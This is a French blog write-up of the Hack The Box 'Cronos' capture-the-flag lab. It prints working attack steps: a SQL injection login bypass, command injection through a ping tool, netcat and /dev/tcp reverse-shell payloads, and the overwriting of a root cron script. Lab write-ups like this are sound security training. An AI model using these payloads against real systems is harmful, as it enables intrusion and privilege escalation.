---
title: "Write-up : Hack The Box - Cronos [MEDIUM]"
date: 2025-06-08T14:00:00+02:00
draft: false
author: "AntoineWHR"
tags: ["HackTheBox", "CTF", "Linux", "SQLi", "Command Injection", "Crontab", "Privilege Escalation"]
categories: ["WriteUps"]
comment:
  enable: true
description: "Solution complète du challenge Hack The Box Cronos, de l'injection SQL à l'élévation de privilèges via crontab."
---

<!--more-->

# **Write-up : Hack The Box - Cronos [MEDIUM]**

{{< admonition info "Informations sur la Box" >}}
*   **Nom :** Cronos
*   **Plateforme :** Hack The Box
*   **Difficulté Annoncée :** Medium
*   **Objectif :** Obtenir les flags `user.txt` et `root.txt`.
*   **IP cible :** 10.129.227.211
{{< /admonition >}}

## **Introduction**

Cette box Medium de Hack The Box nous invite à exploiter une application web vulnérable aux injections SQL et de commandes.

## **Phase 1 : Reconnaissance & Énumération**

### **1. Scan des Ports (Nmap)**

Commençons par identifier les services sur la machine cible avec un scan Nmap.

```bash
nmap -sC -sV 10.129.227.211
```

![NMAP](/images/imagescrnos/image-2.png)

{{< admonition note "Résultats Clés du Scan Nmap" >}}
Le scan révèle trois ports ouverts :

*   **Port 22 (SSH) :** OpenSSH 7.2p2 Ubuntu - Service SSH pour l'accès distant
*   **Port 53 (DNS) :** ISC BIND 9.10.3-P4 - Service DNS, parfait pour l'énumération de sous-domaines
*   **Port 80 (HTTP) :** Apache httpd 2.4.18 Ubuntu - Serveur web principal

Le service HTTP sera notre cible principale, et la présence du DNS suggère des sous-domaines à découvrir.
{{< /admonition >}}

### **2. Exploration Web & Énumération de Sous-domaines**

Le site principal ne révèle rien d'intéressant. Let's go énumérer les sous-domaines avec gobuster :

```bash
gobuster vhost -u "cronos.htb" -w /usr/share/wfuzz/general/common.txt --append-domain
```



{{< admonition tip "Découverte Cruciale - Sous-domaine Admin" >}}
L'énumération révèle **admin.cronos.htb**. N'oublions pas de l'ajouter dans notre `/etc/hosts`.
{{< /admonition >}}

## **Phase 2 : Exploitation - Injection SQL**

### **Analyse du Panneau d'Administration**

En visitant `admin.cronos.htb`, nous découvrons une page de connexion classique. Après avoir examiné le code source sans succès, testons les vulnérabilités d'injection SQL les plus communes.

### **Bypass d'Authentification SQL**

Tentons une injection SQL classique pour contourner l'authentification :

```sql
admin' -- -
```


![gobuster](/images/imagescrnos/image-3.png)



{{< admonition success "Injection SQL Réussie !" >}}
L'injection SQL fonctionne parfaitement ! Nous accédons au dashboard admin.
{{< /admonition >}}

![sqlmeme](/images/imagescrnos/1_YGBbNkBIEvmiDFGC3dXpDw.jpg)

## **Phase 3 : Exploitation - Injection de Commandes**

### **Analyse du Dashboard**

Le dashboard présente un outil "Net Tool v0.1" permettant d'exécuter des commandes comme traceroute et ping. On dirait qu'on va devoir injecter de la commande par ici ! 

### **Test d'Injection de Commandes**

Testons l'injection de commandes en ajoutant des commandes supplémentaires après une adresse IP valide :

```bash
8.8.8.8; ls
```

La commande s'exécute avec succès ! Nous pouvons maintenant explorer le système :

```bash
8.8.8.8; cat /home/nolis/user.txt
```

{{< admonition success "Flag Utilisateur Obtenu !" >}}
L'injection de commandes fonctionne parfaitement et nous permet de récupérer directement le flag utilisateur depuis `/home/nolis/user.txt`.
{{< /admonition >}}

## **Phase 4 : Obtention d'un Shell Interactif**

### **Configuration du Reverse Shell**

Pour un meilleur contrôle de la machine, établissons un reverse shell. Utilisons un payload classique :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.22 5555 >/tmp/f
```

```bash
nc -lnvp 5555
```

Et exécutons le payload via l'interface web. Nous obtenons un shell en tant qu'utilisateur `www-data`.

![dashboard](/images/imagescrnos/image-4.png)


## **Phase 5 : Élévation de Privilèges - Analyse du Système**

### **Exploration des Privilèges et Processus**

En tant que `www-data`, nos privilèges sont limités. Le nom de la box "Cronos" suggère que l'élévation de privilèges implique les tâches cron.
C'est assez commun à HTB donc vérifions ! 
```bash
cat /etc/crontab
```

![revshell](/images/imagescrnos/image-5.png)


### **Découverte Cruciale - Tâche Cron Root**


{{< admonition warning "Tâche Cron Vulnérable Identifiée !" >}}
BINGO! Le système exécute régulièrement le script `/var/www/laravel/artisan` en tant que root. 
{{< /admonition >}}

## **Phase 6 : Exploitation de la Tâche Cron**

### **Modification du Script Artisan**

Remplaçons le contenu du script `artisan` par un reverse shell qui se connectera à notre machine :

```bash
echo '<?php exec("bash -c '\''bash -i >& /dev/tcp/10.10.14.22/5556 0>&1'\''");' > /var/www/laravel/artisan
```

### **Configuration de l'Écoute**

```bash
# Sur notre machine d'attaque
nc -lnvp 5556
```

### **Attente de l'Exécution Automatique**

Patientons le temps que la tâche cron s'exécute automatiquement (toutes les minutes)....

![waiting](/images/imagescrnos/ba7o0.jpg)

![artisan](/images/imagescrnos/image-6.png)

{{< admonition success "Root Obtenu !" >}}
Le reverse shell s'active et nous obtenons un accès root ! La manipulation de la tâche cron fonctionne parfaitement.
{{< /admonition >}}

### **Récupération du Flag Root**

```bash
id
cat /root/root.txt
```

## **Conclusion**

{{< admonition summary "Résumé de l'Exploitation" >}}
Cette box Cronos est pas mal et nous permet de voir : 

1. **Énumération DNS** 
2. **Injection SQL** 
3. **Injection de commandes** 
4. **Reverse shell** 
5. **Analyse des crontabs** 
6. **Manipulation de fichiers** 

{{< /admonition >}}

Box très accessible pour une "Medium", parfaite pour comprendre l'importance de l'énumération complète et l'exploitation des cronjobs.

![pwn](/images/imagescrnos/image.png)
